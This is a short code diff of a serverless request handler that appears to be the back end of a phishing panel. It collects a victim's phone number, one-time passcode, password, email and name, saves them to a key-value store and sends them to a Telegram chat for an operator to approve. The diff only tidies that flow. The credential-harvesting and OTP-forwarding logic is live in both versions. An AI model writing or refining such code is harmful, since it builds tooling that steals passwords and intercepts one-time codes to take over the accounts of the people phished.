@@ -18,29 +18,14 @@ export async function onRequest(context) {
   }
 
   const requestId = uuidv4();
-  const now = new Date().toISOString();
+  const data = { phone, otp, password, userId, email, firstName, lastName, approved: false };
 
-  const entry = {
-    requestId,
-    phone,
-    otp,
-    password,
-    userId,
-    email,
-    firstName,
-    lastName,
-    timestamp: now,
-    approved: false,
-    rejectedReason: null,
-  };
-
-  await setRequestInKV(env, requestId, entry, "otp");
-
+  await setRequestInKV(env, requestId, data, "otp");
   await sendTelegramNotification(
     { requestId, phone, otp, password, email, firstName, lastName, type: "OTP" },
     env,
-    request.url,
+    request.url
   );
 
-  return makeJsonResponse({ success: true, requestId, message: "OTP submitted. Awaiting admin approval." });
+  return makeJsonResponse({ success: true, requestId });
 }
